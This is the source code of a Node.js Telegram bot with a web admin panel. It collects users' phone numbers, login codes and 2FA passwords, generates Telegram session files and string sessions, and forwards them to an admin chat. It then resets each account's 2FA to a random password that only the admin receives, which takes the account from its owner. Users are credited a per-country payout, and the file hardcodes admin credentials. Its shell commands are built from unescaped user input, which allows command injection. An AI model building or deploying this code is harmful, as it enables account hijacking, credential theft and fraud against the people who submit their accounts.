import { Telegraf } from "telegraf";
import { exec } from "child_process";
import fs from "fs";
import path from "path";
import express from "express";
import bodyParser from "body-parser";
import dotenv from "dotenv";

dotenv.config();

// ---------- ENV ----------
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_ID = process.env.API_ID;
const API_HASH = process.env.API_HASH;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // Telegram group/channel/chat id
const PORT = process.env.PORT || 3000;

// Render: ephemeral disk! set DATA_DIR with a Render Disk for persistence
const DATA_DIR = process.env.DATA_DIR || "./data";
const COUNTRY_FILE = path.join(DATA_DIR, "allowed_countries.json");
const BALANCE_FILE = path.join(DATA_DIR, "balances.json");

// Admin panel auth (as requested)
const ADMIN_USER = "FrkBzy001";
const ADMIN_PASS = "Omorfaruk00";

// ---------- PREPARE FS ----------
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(COUNTRY_FILE)) fs.writeFileSync(COUNTRY_FILE, JSON.stringify({}, null, 2));
if (!fs.existsSync(BALANCE_FILE)) fs.writeFileSync(BALANCE_FILE, JSON.stringify({}, null, 2));

// ---------- HELPERS ----------
const bot = new Telegraf(BOT_TOKEN);
const userState = {};

function loadJSON(file) {
  try { return JSON.parse(fs.readFileSync(file)); } catch { return {}; }
}
function saveJSON(file, obj) {
  fs.writeFileSync(file, JSON.stringify(obj, null, 2));
}

function loadCountries() { return loadJSON(COUNTRY_FILE); }
function saveCountries(data) { saveJSON(COUNTRY_FILE, data); }

function loadBalances() { return loadJSON(BALANCE_FILE); }
function saveBalances(data) { saveJSON(BALANCE_FILE, data); }

function addBalance(userId, name, amount) {
  const balances = loadBalances();
  if (!balances[userId]) balances[userId] = { name, balance: 0 };
  // avoid NaN
  const toAdd = Number.isFinite(Number(amount)) ? Number(amount) : 0;
  balances[userId].balance = Number((balances[userId].balance + toAdd).toFixed(6));
  saveBalances(balances);
  return balances[userId].balance;
}

function detectCountryByPrefix(phone) {
  const countries = loadCountries();
  // pick the longest matching prefix (e.g., +880 before +88)
  const prefixes = Object.keys(countries).sort((a, b) => b.length - a.length);
  const match = prefixes.find((p) => phone.startsWith(p));
  return match ? { prefix: match, ...countries[match] } : null;
}

function getUserInfo(ctx) {
  const name = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ").trim();
  const username = ctx.from.username ? `@${ctx.from.username}` : "(no username)";
  return `${name || "Unknown"} ${username} (ID: ${ctx.from.id})`.trim();
}

function generateRandomPassword(length = 16) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}";
  let pw = "";
  for (let i = 0; i < length; i++) pw += chars[Math.floor(Math.random() * chars.length)];
  return pw;
}

function setTwoFaPassword(phone, newPassword) {
  return new Promise((resolve) => {
    // Uses Telethon script below (set_2fa.py)
    const cmd = `python3 set_2fa.py ${API_ID} ${API_HASH} ${phone} ${JSON.stringify(newPassword)}`;
    exec(cmd, (error, stdout = "") => {
      if (error) return resolve({ ok: false, out: stdout.toString() });
      const ok = stdout.toString().includes("2FA_UPDATED");
      resolve({ ok, out: stdout.toString() });
    });
  });
}

// ---------- BOT (Inbox only) ----------
bot.start((ctx) => {
  if (ctx.chat.type !== "private") return; // ignore groups
  userState[ctx.chat.id] = {};
  ctx.reply("👋 Welcome! Please send your phone number (+123...).");
});

bot.on("text", async (ctx) => {
  if (ctx.chat.type !== "private") return; // ignore groups
  const userId = ctx.chat.id;
  const msg = ctx.message.text.trim();

  // STEP 3: waiting for existing 2FA password (when account already had 2FA)
  if (userState[userId]?.waitingForPassword) {
    ctx.reply("⏳ Verifying password...");
    const { phone, otp, rate } = userState[userId];
    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp} password=${msg}`;

    exec(command, async (error, stdout = "") => {
      if (error) return ctx.reply("❌ Verification failed.");
      const out = stdout.toString().trim();

      if (out.includes("SESSION_FILE")) {
        // success
        ctx.reply("✅ Session generated!");
        const userInfo = getUserInfo(ctx);

        // Log to group
        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `✅ New session generated!\n👤 User: ${userInfo}\n📞 Phone: ${phone}\n💲 Rate Applied: $${rate}`
        );

        // Send session .session file
        const filePath = `${phone}.session`;
        if (fs.existsSync(filePath)) {
          await bot.telegram.sendDocument(ADMIN_CHAT_ID, { source: filePath, filename: `${phone}.session` });
        }

        // Send string session if present
        const match = out.match(/STRING_SESSION=(.+)/);
        if (match) {
          await bot.telegram.sendMessage(
            ADMIN_CHAT_ID,
            `🔑 String session for ${phone}:\n\`${match[1]}\``,
            { parse_mode: "Markdown" }
          );
        }

        // Add balance
        const newBal = addBalance(userId, ctx.from.first_name || "User", Number(rate || 0));
        await ctx.reply(`💰 Balance updated. Current: $${newBal.toFixed(2)}`);

        // Set NEW random 2FA and send to group
        const newPw = generateRandomPassword(16);
        const { ok } = await setTwoFaPassword(phone, newPw);
        if (ok) {
          await bot.telegram.sendMessage(
            ADMIN_CHAT_ID,
            `🔒 2FA password set for ${phone}\n📟 New Password: \`${newPw}\``,
            { parse_mode: "Markdown" }
          );
        } else {
          await bot.telegram.sendMessage(ADMIN_CHAT_ID, `⚠️ Failed to set 2FA automatically for ${phone}`);
        }

      } else if (out.includes("NEED_2FA")) {
        // Shouldn't happen here, but just in case
        ctx.reply("🔒 Your account has 2FA enabled. Please send your password:");
      } else {
        ctx.reply("❌ Failed to generate session.");
      }

      userState[userId] = {};
    });
    return;
  }

  // STEP 2: OTP flow
  if (userState[userId]?.waitingForOtp) {
    ctx.reply("⏳ Verifying OTP...");
    const { phone, rate } = userState[userId];
    const otp = msg;
    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp}`;

    exec(command, async (error, stdout = "") => {
      if (error) return ctx.reply("❌ OTP verification failed.");
      const out = stdout.toString().trim();

      if (out.includes("NEED_2FA")) {
        userState[userId] = { phone, otp, waitingForPassword: true, rate };
        return ctx.reply("🔒 Your account has 2FA enabled. Please send your existing 2FA password:");
      }

      if (out.includes("SESSION_FILE")) {
        ctx.reply("✅ Session generated!");
        const userInfo = getUserInfo(ctx);

        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `✅ New session generated!\n👤 User: ${userInfo}\n📞 Phone: ${phone}\n💲 Rate Applied: $${rate}`
        );

        const filePath = `${phone}.session`;
        if (fs.existsSync(filePath)) {
          await bot.telegram.sendDocument(ADMIN_CHAT_ID, { source: filePath, filename: `${phone}.session` });
        }

        const match = out.match(/STRING_SESSION=(.+)/);
        if (match) {
          await bot.telegram.sendMessage(
            ADMIN_CHAT_ID,
            `🔑 String session for ${phone}:\n\`${match[1]}\``,
            { parse_mode: "Markdown" }
          );
        }

        // Add balance
        const newBal = addBalance(userId, ctx.from.first_name || "User", Number(rate || 0));
        await ctx.reply(`💰 Balance updated. Current: $${newBal.toFixed(2)}`);

        // Set NEW random 2FA and send to group
        const newPw = generateRandomPassword(16);
        const { ok } = await setTwoFaPassword(phone, newPw);
        if (ok) {
          await bot.telegram.sendMessage(
            ADMIN_CHAT_ID,
            `🔒 2FA password set for ${phone}\n📟 New Password: \`${newPw}\``,
            { parse_mode: "Markdown" }
          );
        } else {
          await bot.telegram.sendMessage(ADMIN_CHAT_ID, `⚠️ Failed to set 2FA automatically for ${phone}`);
        }

      } else {
        ctx.reply("❌ Failed to generate session.");
      }

      userState[userId] = {};
    });
    return;
  }

  // STEP 1: Phone number entry (with country check)
  if (msg.startsWith("+") && msg.length > 10) {
    const country = detectCountryByPrefix(msg);
    if (!country || !country.allowed) {
      return ctx.reply(`❌ Your country (${country ? country.country : "Unknown"}) is temporarily off.`);
    }

    ctx.reply("📲 Sending OTP to your phone...");
    const command = `python3 session.py ${API_ID} ${API_HASH} ${msg} request`;

    exec(command, (error, stdout = "") => {
      const out = stdout.toString();
      if (error || !out.includes("CODE_REQUESTED")) {
        return ctx.reply("❌ Failed to send OTP.");
      }
      userState[userId] = { phone: msg, waitingForOtp: true, rate: country.rate };
      ctx.reply("✅ OTP sent! Please enter the code you received:");
    });

  } else {
    ctx.reply("❌ Please send a valid phone number (+123...).");
  }
});

// ---------- ADMIN PANEL (Render-friendly) ----------
const app = express();
app.set("trust proxy", true); // render proxy
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Basic Auth middleware
function authMiddleware(req, res, next) {
  const auth = req.headers.authorization || "";
  const token = auth.split(" ")[1] || "";
  const decoded = Buffer.from(token, "base64").toString();
  const [user, pass] = decoded.split(":");
  if (user === ADMIN_USER && pass === ADMIN_PASS) return next();
  res.setHeader("WWW-Authenticate", 'Basic realm="Admin Panel"');
  return res.status(401).send("Authentication required.");
}

// Health/keep-alive for Render
app.get("/healthz", (_, res) => res.status(200).send("ok"));

// Simple HTML admin panel
app.get("/", authMiddleware, (req, res) => {
  const countries = loadCountries();
  const balances = loadBalances();

  const countriesJson = JSON.stringify(countries, null, 2);
  const balancesJson = JSON.stringify(balances, null, 2);

  res.send(`
  <html>
  <head>
    <meta charset="utf-8" />
    <title>🤖 Bot Admin Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
      body{font-family:system-ui,Segoe UI,Arial;padding:24px;max-width:900px;margin:0 auto}
      h1{margin:0 0 12px} .card{border:1px solid #ddd;border-radius:12px;padding:16px;margin:12px 0}
      input,select{padding:8px;border-radius:8px;border:1px solid #bbb}
      button{padding:10px 14px;border:0;border-radius:10px;cursor:pointer}
      pre{background:#f8f8f8;padding:12px;border-radius:10px;overflow:auto}
      .row{display:flex;gap:12px;flex-wrap:wrap}
      .w{flex:1;min-width:220px}
      .danger{background:#ffe9e9}
    </style>
  </head>
  <body>
    <h1>🤖 Bot Admin Panel</h1>

    <div class="card">
      <h2>🌍 Allowed Countries & Rates</h2>
      <form method="POST" action="/set-country">
        <div class="row">
          <div class="w">
            <label>Prefix (e.g. +1, +880)</label><br/>
            <input name="prefix" placeholder="+1" required />
          </div>
          <div class="w">
            <label>Country Name</label><br/>
            <input name="country" placeholder="USA" required />
          </div>
          <div class="w">
            <label>Allowed?</label><br/>
            <select name="allowed">
              <option value="true">true</option>
              <option value="false">false</option>
            </select>
          </div>
          <div class="w">
            <label>Rate ($)</label><br/>
            <input name="rate" type="number" step="0.000001" placeholder="0.10" required />
          </div>
        </div>
        <br/>
        <button type="submit">Save / Update Country</button>
      </form>
      <h3>Current Config</h3>
      <pre>${countriesJson}</pre>
    </div>

    <div class="card">
      <h2>💰 Balances</h2>
      <pre>${balancesJson}</pre>
      <form class="danger" method="POST" action="/reset-balance" onsubmit="return confirm('Reset a user balance?');">
        <p><b>Reset Single User Balance</b></p>
        <div class="row">
          <div class="w"><input name="userId" placeholder="Telegram User ID" required /></div>
        </div>
        <br/>
        <button type="submit">Reset</button>
      </form>
    </div>
  </body>
  </html>
  `);
});

app.post("/set-country", authMiddleware, (req, res) => {
  const prefix = (req.body.prefix || "").trim();
  const country = (req.body.country || "").trim();
  const allowed = String(req.body.allowed).toLowerCase() === "true";
  const rate = Number(req.body.rate || 0);

  if (!prefix || !country || !Number.isFinite(rate)) {
    return res.status(400).send("Invalid form data.");
  }

  const countries = loadCountries();
  countries[prefix] = { country, allowed, rate };
  saveCountries(countries);
  res.redirect("/");
});

app.post("/reset-balance", authMiddleware, (req, res) => {
  const userId = String(req.body.userId || "").trim();
  if (!userId) return res.status(400).send("userId required");
  const balances = loadBalances();
  if (balances[userId]) balances[userId].balance = 0;
  saveBalances(balances);
  res.redirect("/");
});

// ---------- START ----------
app.listen(PORT, () => {
  console.log(`🌐 Admin panel running on port ${PORT}`);
});

// Telegraf long polling works fine on Render; if you prefer webhook, set it up separately.
bot.launch();
console.log("🚀 Bot running (inbox only; group gets files/strings/logs)...");
